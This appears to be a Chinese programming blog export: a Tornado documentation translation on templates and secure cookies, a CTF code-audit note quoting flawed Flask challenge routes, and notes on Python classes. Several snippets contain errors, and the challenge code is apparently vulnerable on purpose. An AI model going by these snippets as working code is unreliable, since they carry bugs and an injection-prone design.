<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;&#123;&#123; title &#125;&#125;&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;</span><br><span class="line">     &lt;ul&gt;</span><br><span class="line">       &#123;% for item in items %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123; escape(item) &#125;&#125;&lt;&#x2F;li&gt;</span><br><span class="line">       &#123;% end %&#125;</span><br><span class="line">     &lt;&#x2F;ul&gt;</span><br><span class="line">   &lt;&#x2F;body&gt;</span><br><span class="line"> &lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>如果你把这个目标保存为”template.html”并且把它放在你Python文件的 相同目录下, 你可以使用下面的代码渲染它:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        items &#x3D; [&quot;Item 1&quot;, &quot;Item 2&quot;, &quot;Item 3&quot;]</span><br><span class="line">        self.render(&quot;template.html&quot;, title&#x3D;&quot;My title&quot;, items&#x3D;items)</span><br></pre></td></tr></table></figure>

<p>Tornado模板支持 <em>控制语句(control statements)</em> 和 <em>表达式(expressions)</em>. 控制语句被包在 <code>&#123;%` 和 `%&#125;</code> 中间, e.g., <code>&#123;% if len(items) > 2 %&#125;</code>. 表达式被包在 <code>&#123;&#123;` 和 `&#125;&#125;</code> 之间, e.g., <code>&#123;&#123; items[0] &#125;&#125;</code>.</p>
<p>控制语句或多或少都和Python语句类似. 我们支持 <code>if</code>, <code>for</code>, <code>while</code>, 和 <code>try</code>, 这些都必须使用 <code>&#123;% end %&#125;</code> 来标识结束. 我们也 支持 <em>模板继承(template inheritance)</em> 使用 <code>extends</code> 和 <code>block</code> 标签声明, 这些内容的详细信息都可以在 <a href="../template.html#module-tornado.template"><code>tornado.template</code></a> 中看到.</p>
<p>表达式可以是任意的Python表达式, 包括函数调用. 模板代码会在包含以下对象 和函数的命名空间中执行 (注意这个列表适用于使用 <a href="../web.html#tornado.web.RequestHandler.render"><code>RequestHandler.render</code></a> 和 <a href="../web.html#tornado.web.RequestHandler.render_string"><code>render_string</code></a> 渲染模板的情况. 如果你直接在 <a href="../web.html#tornado.web.RequestHandler"><code>RequestHandler</code></a> 之外使用 <a href="../template.html#module-tornado.template"><code>tornado.template</code></a> 模块, 下面这些很多都不存 在).</p>
<ul>
<li><code>escape</code>: <a href="../escape.html#tornado.escape.xhtml_escape"><code>tornado.escape.xhtml_escape</code></a> 的别名</li>
<li><code>xhtml_escape</code>: <a href="../escape.html#tornado.escape.xhtml_escape"><code>tornado.escape.xhtml_escape</code></a> 的别名</li>
<li><code>url_escape</code>: <a href="../escape.html#tornado.escape.url_escape"><code>tornado.escape.url_escape</code></a> 的别名</li>
<li><code>json_encode</code>: <a href="../escape.html#tornado.escape.json_encode"><code>tornado.escape.json_encode</code></a> 的别名</li>
<li><code>squeeze</code>: <a href="../escape.html#tornado.escape.squeeze"><code>tornado.escape.squeeze</code></a> 的别名</li>
<li><code>linkify</code>: <a href="../escape.html#tornado.escape.linkify"><code>tornado.escape.linkify</code></a> 的别名</li>
<li><code>datetime</code>: Python <a href="https://docs.python.org/3.4/library/datetime.html#module-datetime"><code>datetime</code></a> 模块</li>
<li><code>handler</code>: 当前的 <a href="../web.html#tornado.web.RequestHandler"><code>RequestHandler</code></a> 对象</li>
<li><code>request</code>: <a href="../httputil.html#tornado.httputil.HTTPServerRequest"><code>handler.request</code></a> 的别名</li>
<li><code>current_user</code>: <a href="../web.html#tornado.web.RequestHandler.current_user"><code>handler.current_user</code></a> 的别名</li>
<li><code>locale</code>: <a href="../locale.html#tornado.locale.Locale"><code>handler.locale</code></a> 的别名</li>
<li><code>_</code>: <a href="../locale.html#tornado.locale.Locale.translate"><code>handler.locale.translate</code></a> 的别名</li>
<li><code>static_url</code>: <a href="../web.html#tornado.web.RequestHandler.static_url"><code>handler.static_url</code></a> 的别名</li>
<li><code>xsrf_form_html</code>: <a href="../web.html#tornado.web.RequestHandler.xsrf_form_html"><code>handler.xsrf_form_html</code></a> 的别名</li>
<li><code>reverse_url</code>: <a href="../web.html#tornado.web.Application.reverse_url"><code>Application.reverse_url</code></a> 的别名</li>
<li>所有从 <code>ui_methods</code> 和 <code>ui_modules</code> <code>Application</code> 设置的条目</li>
<li>任何传递给 <a href="../web.html#tornado.web.RequestHandler.render"><code>render</code></a> 或 <a href="../web.html#tornado.web.RequestHandler.render_string"><code>render_string</code></a> 的关键字参数</li>
</ul>
<p>当你正在构建一个真正的应用, 你可能想要使用Tornado模板的所有特性, 尤其是目标继承. 阅读所有关于这些特性的介绍在 <a href="../template.html#module-tornado.template"><code>tornado.template</code></a> 部分 (一些特性, 包括 <code>UIModules</code> 是在 <a href="../web.html#module-tornado.web"><code>tornado.web</code></a> 模块中实现的)</p>
<p>在引擎下, Tornado模板被直接转换为Python. 包含在你模板中的表达式会 逐字的复制到一个代表你模板的Python函数中. 我们不会试图阻止模板语言 中的任何东西; 我们明确的创造一个高度灵活的模板系统, 而不是有严格限制 的模板系统. 因此, 如果你在模板表达式中随意填充(代码), 当你执行它的时 候你也会得到各种随机错误.</p>
<p>所有模板输出默认都会使用 <a href="../escape.html#tornado.escape.xhtml_escape"><code>tornado.escape.xhtml_escape</code></a> 函数转义. 这个行为可以通过传递 <code>autoescape=None</code> 给 <a href="../web.html#tornado.web.Application"><code>Application</code></a> 或者 <a href="../template.html#tornado.template.Loader"><code>tornado.template.Loader</code></a> 构造器来全局改变, 对于一个模板文件可以使 用 <code>&#123;% autoescape None %&#125;</code> 指令, 对于一个单一表达式可以使用 <code>&#123;% raw ...%&#125;</code> 来代替 <code>&#123;&#123; ... &#125;&#125;</code>. 此外, 在每个地方一个可选的 转义函数名可以被用来代替 <code>None</code>.</p>
<p>注意, 虽然Tornado的自动转义在预防XSS漏洞上是有帮助的, 但是它并不能 胜任所有的情况. 在某一位置出现的表达式, 例如Javascript 或 CSS, 可能需 要另外的转义. 此外, 要么是必须注意总是在可能包含不可信内容的HTML中 使用双引号和 <a href="../escape.html#tornado.escape.xhtml_escape"><code>xhtml_escape</code></a> , 要么必须在属性中使用单独的转义函数 (参见 e.g. <a href="http://wonko.com/post/html-escaping">http://wonko.com/post/html-escaping</a>)</p>
<h1 id="认证和安全"><a href="#认证和安全" class="headerlink" title="认证和安全"></a>认证和安全</h1><h2 id="Cookies-和-secure-cookies"><a href="#Cookies-和-secure-cookies" class="headerlink" title="Cookies 和 secure cookies"></a>Cookies 和 secure cookies</h2><p>你可以在用户浏览器中通过 <code>set_cookie</code> 方法设置 cookie:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        if not self.get_cookie(&quot;mycookie&quot;):</span><br><span class="line">            self.set_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;)</span><br><span class="line">            self.write(&quot;Your cookie was not set yet!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            self.write(&quot;Your cookie was set!&quot;)</span><br></pre></td></tr></table></figure>

<p>普通的cookie并不安全, 可以通过客户端修改. 如果你需要通过设置cookie, 例如来识别当前登录的用户, 就需要给你的cookie签名防止伪造. Tornado 支持通过 <a href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.RequestHandler.set_secure_cookie"><code>set_secure_cookie</code></a> 和 <a href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.RequestHandler.get_secure_cookie"><code>get_secure_cookie</code></a> 方法对cookie签名. 想要使用这 些方法, 你需要在你创建应用的时候, 指定一个名为 <code>cookie_secret</code> 的密钥. 你可以在应用的设置中以关键字参数的形式传递给应用程序:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">application &#x3D; tornado.web.Application([</span><br><span class="line">    (r&quot;&#x2F;&quot;, MainHandler),</span><br><span class="line">], cookie_secret&#x3D;&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;)</span><br></pre></td></tr></table></figure>

<p>签名后的cookie除了时间戳和一个 <a href="http://en.wikipedia.org/wiki/HMAC">HMAC</a> 签名还包含编码 后的cookie值. 如果cookie过期或者签名不匹配, <code>get_secure_cookie</code> 将返回 <code>None</code> 就像没有设置cookie一样. 上面例子的安全版本:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MainHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        if not self.get_secure_cookie(&quot;mycookie&quot;):</span><br><span class="line">            self.set_secure_cookie(&quot;mycookie&quot;, &quot;myvalue&quot;)</span><br><span class="line">            self.write(&quot;Your cookie was not set yet!&quot;)</span><br><span class="line">        else:</span><br><span class="line">            self.write(&quot;Your cookie was set!&quot;)</span><br></pre></td></tr></table></figure>

<p>Tornado的安全cookie保证完整性但是不保证机密性. 也就是说, cookie不能被修改 但是它的内容对用户是可见的. 密钥 <code>cookie_secret</code> 是一个对称的key, 而且必 须保密–任何获得这个key的人都可以伪造出自己签名的cookie.</p>
<p>默认情况下, Tornado的安全cookie过期时间是30天. 可以给 <code>set_secure_cookie</code> 使用 <code>expires_days</code> 关键字参数 <em>同时</em> <code>get_secure_cookie</code> 设置 <code>max_age_days</code> 参数也可以达到效果. 这两个值分别通过这样(设置)你就可以达 到如下的效果, 例如大多数情况下有30天有效期的cookie, 但是对某些敏感操作(例 如修改账单信息)你可以使用一个较小的 <code>max_age_days</code> .</p>
<p>Tornado也支持多签名密钥, 使签名密钥轮换. 然后 <code>cookie_secret</code> 必须是一个 以整数key版本作为key, 以相对应的密钥作为值的字典. 当前使用的签名键 必须是 应用设置中 <code>key_version</code> 的集合. 不过字典中的其他key都允许做 cookie签名验证, 如果当前key版本在cookie集合中.为了实现cookie更新, 可以通过 <a href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.RequestHandler.get_secure_cookie_key_version"><code>get_secure_cookie_key_version</code></a> 查询当前key版本.</p>
<h2 id="用户认证"><a href="#用户认证" class="headerlink" title="用户认证"></a>用户认证</h2><p>当前已经通过认证的用户在每个请求处理函数中都可以通过 <a href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.RequestHandler.current_user"><code>self.current_user</code></a> 得到, 在每个模板中 可以使用 <code>current_user</code> 获得. 默认情况下, <code>current_user</code> 是 <code>None</code>.</p>
<p>为了在你的应用程序中实现用户认证, 你需要在你的请求处理函数中复写 <code>get_current_user()</code> 方法来判断当前用户, 比如可以基于cookie的值. 这里有一个例子, 这个例子允许用户简单的通过一个保存在cookie中的特殊昵称 登录到应用程序中:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class BaseHandler(tornado.web.RequestHandler):</span><br><span class="line">    def get_current_user(self):</span><br><span class="line">        return self.get_secure_cookie(&quot;user&quot;)</span><br><span class="line"></span><br><span class="line">class MainHandler(BaseHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        if not self.current_user:</span><br><span class="line">            self.redirect(&quot;&#x2F;login&quot;)</span><br><span class="line">            return</span><br><span class="line">        name &#x3D; tornado.escape.xhtml_escape(self.current_user)</span><br><span class="line">        self.write(&quot;Hello, &quot; + name)</span><br><span class="line"></span><br><span class="line">class LoginHandler(BaseHandler):</span><br><span class="line">    def get(self):</span><br><span class="line">        self.write(&#39;&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&quot;&#x2F;login&quot; method&#x3D;&quot;post&quot;&gt;&#39;</span><br><span class="line">                   &#39;Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot;&gt;&#39;</span><br><span class="line">                   &#39;&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Sign in&quot;&gt;&#39;</span><br><span class="line">                   &#39;&lt;&#x2F;form&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#39;)</span><br><span class="line"></span><br><span class="line">    def post(self):</span><br><span class="line">        self.set_secure_cookie(&quot;user&quot;, self.get_argument(&quot;name&quot;))</span><br><span class="line">        self.redirect(&quot;&#x2F;&quot;)</span><br><span class="line"></span><br><span class="line">application &#x3D; tornado.web.Application([</span><br><span class="line">    (r&quot;&#x2F;&quot;, MainHandler),</span><br><span class="line">    (r&quot;&#x2F;login&quot;, LoginHandler),</span><br><span class="line">], cookie_secret&#x3D;&quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;)</span><br></pre></td></tr></table></figure>

<p>你可以使用 <a href="http://www.python.org/dev/peps/pep-0318/">Python 装饰器(decorator)</a> <a href="https://tornado-zh.readthedocs.io/zh/latest/web.html#tornado.web.authenticated"><code>tornado.web.authenticated</code></a> 要求用户登录. 如果请求方法带有这个装饰器 并且用户没有登录, 用户将会被重定向到 <code>login_url</code> (另一个应用设置). 上面的例子可以被重写:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class MainHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self):</span><br><span class="line">        name &#x3D; tornado.escape.xhtml_escape(self.current_user)</span><br><span class="line">        self.write(&quot;Hello, &quot; + name)</span><br><span class="line"></span><br><span class="line">settings &#x3D; &#123;</span><br><span class="line">    &quot;cookie_secret&quot;: &quot;__TODO:_GENERATE_YOUR_OWN_RANDOM_VALUE_HERE__&quot;,</span><br><span class="line">    &quot;login_url&quot;: &quot;&#x2F;login&quot;,</span><br><span class="line">&#125;</span><br><span class="line">application &#x3D; tornado.web.Application([</span><br><span class="line">    (r&quot;&#x2F;&quot;, MainHandler),</span><br><span class="line">    (r&quot;&#x2F;login&quot;, LoginHandler),</span><br><span class="line">], **settings)</span><br></pre></td></tr></table></figure>

<p>如果你使用 <code>authenticated</code> 装饰 <code>post()</code> 方法并且用户没有登录, 服务将返回一个 <code>403</code> 响应. <code>@authenticated</code> 装饰器是 <code>if not self.current_user: self.redirect()</code> 的简写. 可能不适合 非基于浏览器的登录方案.</p>
<p>通过 <a href="https://github.com/tornadoweb/tornado/tree/stable/demos/blog">Tornado Blog example application</a> 可以看到一个使用用户验证(并且在MySQL数据库中存储用户数据)的完整例子.</p>
<h2 id="代码模板"><a href="#代码模板" class="headerlink" title="代码模板"></a>代码模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line">settings=&#123;<span class="string">&quot;cookie_secret&quot;</span>:<span class="string">&quot;内容&quot;</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">indexhandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.set_secure_cookie(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;cookie值的内容&quot;</span>)</span><br><span class="line">        self.write(self.set_secure_cookie(<span class="string">&quot;username&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app=tornado.web.Application(</span><br><span class="line">        [</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>,indexhandler),</span><br><span class="line">        ],**settings<span class="comment">#cooki_secret:xxxx的简写</span></span><br><span class="line">    )</span><br><span class="line">    app.listen(<span class="number">8004</span>)<span class="comment">#端口注意别冲突</span></span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>python代码审计基础语法</title>
    <url>/2021/04/09/python%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做到一题python代码审计的题目，但是总觉得有点力不从心，大概是掌握的还不够扎实,故决定整理一下遇到的一语法知识<a id="more"></a></p>
<h2 id="语法基础"><a href="#语法基础" class="headerlink" title="语法基础"></a>语法基础</h2><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>所谓路由，**<code>就是处理请求URL和函数之间关系的程序</code>**<br>Flask中也是对URL规则进行统一管理的，创建URL规则有两种方式：</p>
<p>1.使用@app.route修饰器，并传入URL规则作为参数，将函数绑定到URL，这个过程便将一个函数注册为路由，这个函数则被称为视图函数。</p>
<p>2.使用app.add_url_rule()。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action &#x3D; &quot;scan&quot;</span><br><span class="line">    #这里进行和秘钥的拼接后md5的加密传回值</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])</span><br><span class="line">def challenge():</span><br><span class="line">    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    #这里是从cookie传回sign</span><br><span class="line">    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip &#x3D; request.remote_addr</span><br><span class="line">    #有个waf</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task &#x3D; Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&#39;&#x2F;&#39;)</span><br></pre></td></tr></table></figure>

<p>这段代码意味着这个网址有三个页面一个是/geneSign 一个是/De1ta 另一个就是/根目录，每一个路由都是一个新的起点</p>
]]></content>
  </entry>
  <entry>
    <title>python类的继承</title>
    <url>/2021/02/27/python%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>　　面向对象编程 (OOP) 语言的一个主要功能就是“继承”。继承是指这样一种能力：它可以使用现有类的所有功能，并在无需重新编写原来的类的情况下对这些功能进行扩展。 <a id="more"></a></p>
<p>　　通过继承创建的新类称为“子类”或“派生类”，被继承的类称为“基类”、“父类”或“超类”，继承的过程，就是从一般到特殊的过程。在某些 OOP 语言中，一个子类可以继承多个基类。但是一般情况下，一个子类只能有一个基类，要实现多重继承，可以通过多级继承来实现。</p>
<p>　　继承概念的实现方式主要有2类：实现继承、接口继承。</p>
<ol>
<li>实现继承是指使用基类的属性和方法而无需额外编码的能力。</li>
<li>接口继承是指仅使用属性和方法的名称、但是子类必须提供实现的能力(子类重构爹类方法)。</li>
</ol>
<p>　　在考虑使用继承时，有一点需要注意，那就是两个类之间的关系应该是“属于”关系。例如，Employee 是一个人，Manager 也是一个人，因此这两个类都可以继承 Person 类。但是 Leg 类却不能继承 Person 类，因为腿并不是一个人。</p>
<p>　　OO开发范式大致为：划分对象→抽象类→将类组织成为层次化结构(继承和合成) →用类与实例进行设计和实现几个阶段。</p>
<h2 id="继承的定义"><a href="#继承的定义" class="headerlink" title="继承的定义"></a>继承的定义</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">object</span>):</span>   <span class="comment"># 定义一个父类</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span>(<span class="params">self</span>):</span>    <span class="comment"># 父类中的方法</span></span><br><span class="line">        print(<span class="string">&quot;person is talking....&quot;</span>)  </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Person</span>):</span>    <span class="comment"># 定义一个子类， 继承Person类</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">walk</span>(<span class="params">self</span>):</span>      <span class="comment"># 在子类中定义其自身的方法</span></span><br><span class="line">        print(<span class="string">&#x27;is walking...&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">c = Child()</span><br><span class="line">c.talk()      <span class="comment"># 调用继承的Person类的方法</span></span><br><span class="line">c.walk()     <span class="comment"># 调用本身的方法</span></span><br><span class="line"><span class="comment">#_bases_可以查看父类</span></span><br><span class="line">print(<span class="string">&quot;thebases are:&quot;</span>,child._bases_)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 输出</span></span><br><span class="line"> </span><br><span class="line">person <span class="keyword">is</span> talking....</span><br><span class="line"><span class="keyword">is</span> walking...</span><br></pre></td></tr></table></figure>

<p><strong>实现继承后，子类将继承父类的属性，但doc属性不会被继承</strong></p>
<p>经典类的写法： 父类名称.<strong>init</strong>(self,参数1，参数2，…)</p>
<p>当在Python中出现继承的情况时，一定要注意初始化函数_init_的行为:</p>
<p>如果子类没有定义自己的初始化函数，父类的初始化函数会被默认调用；但是如果要实例化子类的对象，则只能传入父类的初始化函数对应的参数，否则会出错。<br>如果子类定义了自己的初始化函数，而在子类中没有显示调用父类的初始化函数，则父类的属性不会被初始化<br>如果子类定义了自己的初始化函数，在子类中显示调用父类，子类和父类的属性都会被初始化</p>
<p>新式类的写法：super(子类，self).<strong>init</strong>(参数1，参数2，….)</p>
<p><strong>super主要来调用父类方法来显示调用父类</strong>，在子类中，一般会定义与父类相同的属性（数据属性，方法），从而来实现子类特有的行为。也就是说，<strong>子类会继承父类的所有的属性和方法，子类也可以覆盖父类同名的属性和方法</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>(<span class="params">object</span>):</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.weight = <span class="string">&#x27;weight&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">talk</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&quot;person is talking....&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span>(<span class="params">Person</span>):</span></span><br><span class="line">                 <span class="comment">#c    bigberg 22  chinese</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age, language</span>):</span>  <span class="comment"># 先继承，在重构</span></span><br><span class="line">        Person.__init__(self, name, age)  <span class="comment">#继承父类的构造方法，也可以写成：super(Chinese,self).__init__(name,age)</span></span><br><span class="line">        self.language = language    <span class="comment"># 定义类的本身属性</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">walk</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;is walking...&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">American</span>(<span class="params">Person</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line">c = Chinese(<span class="string">&#x27;bigberg&#x27;</span>, <span class="number">22</span>, <span class="string">&#x27;Chinese&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>类构造函数基础父类构造函数过程如下：</p>
<p>  <strong>实例化对象c —-&gt; c 调用子类__init__()  —- &gt; 子类__init__()继承父类__init__()  —– &gt; 调用父类 __init__()</strong></p>
<p>参考：<a href="https://blog.csdn.net/brucewong0516/article/details/79121179">https://blog.csdn.net/brucewong0516/article/details/79121179</a><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017594591051072">https://www.liaoxuefeng.com/wiki/1016959663602400/1017594591051072</a><br><a href="https://www.cnblogs.com/bigberg/p/7182741.html">https://www.cnblogs.com/bigberg/p/7182741.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>python类相关基础知识学习</title>
    <url>/2021/02/27/python%E7%B1%BB%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="python——类"><a href="#python——类" class="headerlink" title="python——类"></a>python——类</h2><p>面向对象编程需要使用类，类和实例息息相关，有了类之后我们必须创建一个实例，这样才能调用类的方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>&lt;类名&gt;:</span></span><br><span class="line">    &lt;语句&gt;</span><br></pre></td></tr></table></figure>

<p>类私有属性：_private_attrs两个下划线开头，声明该属性为私有，不能再类的外部被使用或直接访问，在类的内部的方法中使用self._private_attrs             <a id="more"></a><br>类的方法:在类的内部，使用def关键字可以为类定义个一个方法，与一般函数定义不同，类方法必须包含参数self，且为第一个参数</p>
<h3 id="类的专有方法"><a href="#类的专有方法" class="headerlink" title="类的专有方法"></a>类的专有方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__init__       构造函数，在生成对象时调用</span><br><span class="line">__del__        析构函数，释放对象时使用</span><br><span class="line">__repr__       打印，转换</span><br><span class="line">__setitem__    按照索引赋值</span><br><span class="line">__getitem__    按照索引获取值</span><br><span class="line">__len__        获得长度</span><br><span class="line">__cmp__        比较运算</span><br><span class="line">__call__       函数调用</span><br><span class="line">__add__        加运算</span><br><span class="line">__sub__        减运算</span><br><span class="line">__mul__        乘运算</span><br><span class="line">__div__        除运算</span><br><span class="line">__mod__        求余运算</span><br><span class="line">__pow__        称方</span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://blog.csdn.net/brucewong0516/article/details/79114977">https://blog.csdn.net/brucewong0516/article/details/79114977</a></p>
<h2 id="class的属性"><a href="#class的属性" class="headerlink" title="class的属性"></a>class的属性</h2><p>例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>():</span></span><br><span class="line">	tall = <span class="number">180</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name,age,weight</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.weight = weight</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">infoma</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;%s is %s weights %s&#x27;</span>%(self.name,self.age,self.__weight))</span><br><span class="line"></span><br><span class="line">person = person(<span class="string">&#x27;bruce&#x27;</span>,<span class="number">25</span>,<span class="number">60</span>)</span><br><span class="line">infoma = person.infoma()</span><br></pre></td></tr></table></figure>

<h3 id="数据属性"><a href="#数据属性" class="headerlink" title="数据属性"></a>数据属性</h3><p>数据属性分为类数据属性和实例数据属性</p>
<h4 id="类数据属性："><a href="#类数据属性：" class="headerlink" title="类数据属性："></a>类数据属性：</h4><p>就是上面的tall，可以被添加</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span>(<span class="params">object</span>):</span></span><br><span class="line">    tall = <span class="number">180</span></span><br><span class="line">    hobbies = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, age,weight</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.weight = weight</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">infoma</span>(<span class="params">self</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;%s is %s weights %s&#x27;</span>%(self.name,self.age,self.weight))</span><br><span class="line">person.hobbies.extend([<span class="string">&quot;football&quot;</span>, <span class="string">&quot;woman&quot;</span>])   <span class="comment">#类数据属性属于类本身，可以通过类名进行访问/修改，此处添加&quot;football&quot;、&quot;woman&quot;两个</span></span><br><span class="line">print(<span class="string">&quot;person hobbies list: %s&quot;</span> %person.hobbies   ) </span><br><span class="line"><span class="comment"># class can add class attribute after class defination</span></span><br><span class="line">person.hobbies2 = [<span class="string">&quot;reading&quot;</span>, <span class="string">&quot;jogging&quot;</span>, <span class="string">&quot;swimming&quot;</span>]  <span class="comment">#在类定义之后，可以通过类名动态添加类数据属性，新增的类属性也被类和所有实例共有</span></span><br><span class="line">print( <span class="string">&quot;person hobbies2 list: %s&quot;</span> %person.hobbies2  )  </span><br><span class="line">print( dir(person))</span><br></pre></td></tr></table></figure>

<h5 id="特殊的类属性："><a href="#特殊的类属性：" class="headerlink" title="特殊的类属性："></a>特殊的类属性：</h5><p>对于所有的类，都有一组特殊的属性</p>
<p>_ _ name_ _：类的名字（字符串）<br>_ _ doc _ _ ：类的文档字符串<br>_ _ bases _ _：类的所有父类组成的元组<br>_ _ dict _ _：类的属性组成的字典<br>_ _ module _ _：类所属的模块<br>_ _ class _ _：类对象的类型</p>
<h4 id="实例数据属性："><a href="#实例数据属性：" class="headerlink" title="实例数据属性："></a>实例数据属性：</h4><p>例如name，只能通过实例访问</p>
